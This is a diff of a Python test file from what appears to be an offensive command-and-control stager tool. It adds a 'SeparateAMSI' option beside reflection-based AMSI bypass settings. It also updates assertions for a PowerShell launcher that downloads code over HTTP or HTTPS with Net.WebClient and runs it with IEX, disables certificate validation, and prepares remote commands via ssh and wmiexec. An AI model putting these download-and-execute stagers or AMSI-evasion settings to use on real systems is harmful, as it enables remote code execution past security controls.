@@ -30,6 +30,7 @@ def get_stager():
             "flavor": "hub",
             "Launcher": "powershell",
             "Amsi": "reflection",
+            "SeparateAMSI": "true",
             "Transport": "http",
             "ClipExec": "none",
             "Proxy": "false",
@@ -42,6 +43,7 @@ def get_stager():
             "flavor": "hub",
             "Launcher": "powershell",
             "Amsi": "reflection",
+            "SeparateAMSI": "true",
             "Transport": "https",
             "ClipExec": "none",
             "Proxy": "false",
@@ -54,6 +56,7 @@ def get_stager():
             "flavor": "hub",
             "Launcher": "bash",
             "Amsi": "reflection",
+            "SeparateAMSI": "true",
             "Transport": "http",
             "ClipExec": "none",
             "Proxy": "false",
@@ -102,17 +105,17 @@ def full_app():
 
 def test_stager(full_app):
     assert (
-        "$K=New-Object Net.WebClient;IEX "
+        "$K=New-Object Net.WebClient;'a=reflection','t=http'|%{IEX "
         + f"$K.DownloadString('http://{TEST_URI}:8080"
-        + "/0?t=http&a=reflection');"
+        + "/0?'+$_)"
     ) in (full_app['default'])
     assert (
         "[System.Net.ServicePointManager]::ServerCertificateValidationCallback"
         + "={param($1,$2);$2.Thumbprint -eq '"
     ) in (full_app['HTTPS'])
     assert (
-        "'};$K=New-Object Net.WebClient;IEX $K.DownloadString"
-        + f"('https://{TEST_URI}:8443/0?t=https&a=reflection');"
+        "'};$K=New-Object Net.WebClient;'a=reflection','t=https'|%{IEX "
+        + f"$K.DownloadString('https://{TEST_URI}:8443/0?'+$_)" + "}"
     ) in (full_app['HTTPS'])
 
 
@@ -121,13 +124,15 @@ def backends(full_app):
     # win10 uses ssh
     win10cmd = TEST_COMMANDS["win10"] % full_app
     # Insert formatter for extra command
-    win10cmd = win10cmd[:-2] + '%s' + win10cmd[-2:]
+    win10cmd = win10cmd.replace('%', '%%')
+    win10cmd = win10cmd[:-2] + ';%s' + win10cmd[-2:]
 
     # win7 uses wmiexec
     win7cmd = TEST_COMMANDS["win7"] % full_app
     win7cmd = win7cmd.replace('\\$', '$')
+    win7cmd = win7cmd.replace('%', '%%')
     # Insert formatter for extra command
-    win7cmd = win7cmd[:-3] + '%s' + win7cmd[-3:]
+    win7cmd = win7cmd[:-3] + ';%s' + win7cmd[-3:]
 
     return {
         "win10": lambda c: win10cmd % c.replace('"', '\\"'),
